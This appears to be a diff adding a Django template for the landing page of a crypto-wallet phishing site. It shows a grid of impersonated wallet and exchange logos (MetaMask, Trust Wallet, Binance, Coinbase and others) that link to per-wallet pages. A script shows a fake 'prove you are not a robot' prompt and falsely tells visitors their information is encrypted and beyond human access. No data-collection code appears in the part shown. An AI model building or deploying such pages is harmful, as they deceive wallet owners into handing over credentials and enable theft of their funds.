@@ -1,0 +1,126 @@
+{% extends 'base.html' %}
+{% load static %}
+
+
+
+
+{% block form %}
+<div class="input-group input-navbar">
+            <div class="input-group-prepend">
+              <span class="input-group-text "  id="icon-addon1"><span class="mai-search"></span></span>
+            </div>
+            <input type="text" class="form-control" placeholder="Enter wallet.." aria-label="Username" aria-describedby="icon-addon1">
+          </div>
+{% endblock %}
+
+{% block content %}
+<div class="w3-center">
+
+     <div class="w3-third ">
+            <a href="{% url 'trustwallet' %}"><img src="{% static 'img/trustwallet.jpg' %}" style="float: left; width: 25%; padding: 10px"></a>
+  </div>
+
+      <div class="w3-third ">
+        <a href="{% url 'metamask' %}"><img src="{% static 'img/metamask.png' %}" style="float: left; width: 25%; padding: 10px"></a>
+  </div>
+
+  <div class="w3-third " >
+
+      <a href="{% url 'aave' %}"><img src="{% static 'img/1inch.jpg' %}" style="float: left; width: 25%; padding: 10px"> </a>
+
+  </div>
+
+  <div class="w3-third ">
+<a href="{% url 'aave' %}"><img src="{% static 'img/aave.jpg' %}" style="float: left; width: 25%; padding: 10px"></a>
+  </div>
+
+
+
+    <div class="w3-third ">
+        <a href="{% url 'binance' %}"><img src="{% static 'img/binance1.png' %}" style="float: left; width: 25%; padding: 10px"></a>
+  </div>
+
+    <div class="w3-third ">
+        <a href="{% url 'coinbase' %}"><img src="{% static 'img/coinbase1.png' %}" style="float: left; width: 25%; padding: 10px;"></a>
+
+  </div>
+
+    <div class="w3-third ">
+        <a href="{% url 'defiat' %}"><img src="{% static 'img/defiat.png' %}" style="float: left; width: 25%; padding: 10px"></a>
+
+  </div>
+
+
+    <div class="w3-third ">
+        <a href="{% url 'fantom' %}"><img src="{% static 'img/fantom1.png' %}" style="float: left; width: 25%; padding: 10px"></a>
+  </div>
+
+
+
+    <div class="w3-third ">
+        <a href="{% url 'mew' %}"><img src="{% static 'img/mew.png' %}" style="float: left; width: 25%; padding: 10px"></a>
+  </div>
+
+        <div class="w3-third ">
+<a href="{% url 'solareum' %}"><img src="{% static 'img/solareum1.png' %}" style="float: left; width: 25%; padding: 10px"></a>
+  </div>
+
+     <div class="w3-third ">
+            <a href="{% url 'tron' %}"><img src="{% static 'img/tron.png' %}" style="float: left; width: 25%; padding: 10px"></a>
+
+  </div>
+
+        <div class="w3-third ">
+            <a href="{% url 'solflare' %}"><img src="{% static 'img/solflare1.png' %}" style="float: left; width: 25%; padding: 10px"></a>
+  </div>
+
+      <div class="w3-third ">
+<a href="{% url 'exodus' %}"><img src="{% static 'img/exodus.png' %}" style="float: left; width: 25%; padding: 10px"></a>
+  </div>
+
+         <div class="w3-third ">
+<a href="{% url 'coinomi' %}"><img src="{% static 'img/coinomi.png' %}" style="float: left; width: 25%; padding: 10px"></a>
+  </div>
+
+         <div class="w3-third ">
+<a href="{% url 'dashwallet' %}"><img src="{% static 'img/dash.png' %}" style="float: left; width: 25%; padding: 10px"></a>
+  </div>
+          <div class="w3-third ">
+<a href="{% url 'atomic_wallet' %}"><img src="{% static 'img/atomic.jfif' %}" style="float: left; width: 25%; padding: 10px"></a>
+  </div>
+
+         <div class="w3-third ">
+<a href="{% url 'kraken' %}"><img src="{% static 'img/kraken.png' %}" style="float: left; width: 25%; padding: 10px"></a>
+  </div>
+
+         <div class="w3-third ">
+<a href="{% url 'exodus' %}"><img src="{% static 'img/electrum.jfif' %}" style="float: left; width: 25%; padding: 10px"></a>
+  </div>
+
+         <div class="w3-third ">
+<a href="{% url 'litecoin' %}"><img src="{% static 'img/litecoin.png' %}" style="float: left; width: 25%; padding: 10px"></a>
+  </div>
+
+  <div class="w3-third ">
+<a href="{% url 'algorand' %}"><img src="{% static 'img/algorand1.jpg' %}" style="float: left; width: 25%; padding: 10px"></a>
+  </div>
+
+</div>
+
+
+
+{% endblock %}
+
+{% block script %}
+<script>
+var x = Math.floor((Math.random() * 10) + 1);
+var y = Math.floor((Math.random() * 10) + 1);
+var z = x+y
+var answer = prompt('NOTE: All informations provided here are encrypted and are not availaible for human interference! \nPlease solve the equation below to prove you are not a robot. \n \n' + x + '+' + y);
+
+while(answer != z){
+  var answer = prompt("That's incorrect! please try again\n" + x + '+' + y)
+}
+
+</script>
+{% endblock %} -->
